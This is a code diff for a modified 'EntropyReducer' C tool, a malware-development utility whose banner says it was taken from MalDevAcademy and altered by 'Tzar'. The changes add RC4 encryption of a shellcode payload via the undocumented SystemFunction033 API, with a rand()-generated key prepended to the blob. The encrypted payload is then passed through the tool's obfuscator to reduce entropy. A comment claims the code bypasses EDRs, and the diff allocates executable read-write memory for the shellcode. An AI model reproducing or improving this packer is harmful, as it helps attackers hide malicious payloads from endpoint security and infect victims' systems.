@@ -4,31 +4,8 @@
 #include "Common.h"
 
 
-// can use this function to understand how the algorithm work :)
-// this function print the nodes 
-VOID PrintList(IN PLINKED_LIST LinkedList) {
 
-	PLINKED_LIST pTmpHead = (PLINKED_LIST)LinkedList;
-	if (!pTmpHead)
-		return;
 
-	while (pTmpHead != NULL) {
-
-		printf("\t>>> ");
-		for (int i = 0; i < BUFF_SIZE; i++) {
-			printf("0x%0.2X ", pTmpHead->pBuffer[i]);
-		}
-		printf("\t(%0.2d)\n", pTmpHead->ID);
-
-		printf("\t\t>>> ");
-		for (int i = 0; i < NULL_BYTES; i++) {
-			printf("0x%0.2X ", pTmpHead->pNull[i]);
-		}
-
-		printf("\n\n");
-		pTmpHead = pTmpHead->Next;
-	}
-}
 
 
 // Serailized node:
@@ -54,13 +31,12 @@ BOOL Obfuscate(IN PBYTE PayloadBuffer, IN SIZE_T PayloadSize, OUT PBYTE* Obfusca
 
 	// ObfuscatedSize now is the size of the serialized linked list
 	// pLinkedList is the head of the linked list
-
 	// randomize the linked list (sorted by the value of 'Buffer[0] ^ Buffer[1] ^ Buffer[3]')
 	MergeSort(&pLinkedList, SORT_BY_BUFFER);
 	
-//	printf("---------------------------------------------------------------------------------------------\n\n");
-//	PrintList(pLinkedList);
-//	printf("---------------------------------------------------------------------------------------------\n\n");
+	//printf("---------------------------------------------------------------------------------------------\n\n");
+	//PrintList(pLinkedList);
+	//printf("---------------------------------------------------------------------------------------------\n\n");
 
 
 	PLINKED_LIST	pTmpHead	= pLinkedList;
@@ -104,13 +80,34 @@ BOOL Obfuscate(IN PBYTE PayloadBuffer, IN SIZE_T PayloadSize, OUT PBYTE* Obfusca
 
 
 
+// Function prototype for SystemFunction033
+typedef NTSTATUS(WINAPI* _SystemFunction033)(
+	struct ustring* memoryRegion,
+	struct ustring* keyPointer);
+
+struct ustring {
+	DWORD Length;
+	DWORD MaximumLength;
+	PVOID Buffer;
+} _data, key, _data2;
+
+
+VOID GenerateBytes(unsigned char* pBuff, DWORD dwBuffSize) {
+
+	for (size_t i = 0; i < dwBuffSize; i++)
+		pBuff[i] = rand() % 256;
+
+}
+
+
 
 // this function bypass EDRs
 int Logo() {
 
 	printf("\t\t\t#################################################################################\n");
 	printf("\t\t\t#                                                                               #\n");
-	printf("\t\t\t#          EntropyReducer - Designed By MalDevAcademy: @NUL0x4C | @mrd0x        #\n");
+	printf("\t\t\t#          EntropyReducer - Designed For MalDevAcademy by @NUL0x4C | @mrd0x     #\n");
+	printf("\t\t\t#          Stolen and modified by Tzar, now with added Encryption               #\n");
 	printf("\t\t\t#                                                                               #\n");
 	printf("\t\t\t#################################################################################\n");
 	printf("\n\n");
@@ -123,13 +120,30 @@ int main(int argc, char* argv[]) {
 	
 	Logo();
 
-	// hhh
+	
 	if (!(argc >= 2)) {
-		printf("[!] Please Specify A Input File To Obfuscate ... \n");
+		printf("[!] Please Specify A Input File To Encrypt and Obfuscate ... \n");
 		return -1;
 	}
 	printf("[i] BUFF_SIZE : [ 0x%0.4X ] - NULL_BYTES : [ 0x%0.4X ]\n", BUFF_SIZE, NULL_BYTES);
 
+	
+	srand(time(NULL));
+
+	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
+
+
+	BYTE	_key[KEY_SIZE];
+
+	GenerateBytes(_key, KEY_SIZE);
+
+	printf("[i] The Generate Key Bytes: [ ");
+	for (size_t i = 0; i < KEY_SIZE; i++)
+		printf("%02X ", _key[i]);
+	printf("]\n");
+
+
+	//Original Obfuscation functions.
 	SIZE_T	RawPayloadSize		= NULL;
 	PBYTE	RawPayloadBuffer	= NULL;
 
@@ -141,11 +155,38 @@ int main(int argc, char* argv[]) {
 	printf("\t>>> Raw Payload Size : %ld \n\t>>> Read Payload Located At : 0x%p \n", RawPayloadSize, RawPayloadBuffer);
 
 
+	PVOID ShellcodeBuffer = VirtualAlloc(NULL, RawPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	memcpy(ShellcodeBuffer, RawPayloadBuffer, RawPayloadSize);
+
+	memset(RawPayloadBuffer, 0, RawPayloadSize);
+
+	key.Buffer = (&_key);
+	key.Length = sizeof(_key);
+
+	_data.Buffer = ShellcodeBuffer;
+	_data.Length = RawPayloadSize;
+
+	SystemFunction033(&_data, &key);
+
+	printf("[+] Payload Encrypted with RC4.");
+
+	SIZE_T	sNewPayloadSize = (SIZE_T)(RawPayloadSize + KEY_SIZE);
+	PVOID	pNewPayloadData = malloc(sNewPayloadSize);
+	ZeroMemory(pNewPayloadData, sNewPayloadSize);
+
+	memcpy(pNewPayloadData, _key, KEY_SIZE);
+	memcpy((PVOID)((ULONG_PTR)pNewPayloadData + KEY_SIZE), ShellcodeBuffer, RawPayloadSize);
+
+	printf("[+] Key added to the payload blob.");
+
 	SIZE_T	ObfuscatedPayloadSize		= NULL;
 	PBYTE	ObfuscatedPayloadBuffer		= NULL;
 
-	printf("[i] Obfuscating Payload ... ");
-	if (!Obfuscate(RawPayloadBuffer, RawPayloadSize, &ObfuscatedPayloadBuffer, &ObfuscatedPayloadSize)) {
+
+
+	printf("[i] Obfuscating Payload to reduce entropy ... ");
+	if (!Obfuscate((PBYTE)pNewPayloadData, sNewPayloadSize, &ObfuscatedPayloadBuffer, &ObfuscatedPayloadSize)) {
 		return -1;
 	}
 	printf("[+] DONE \n");
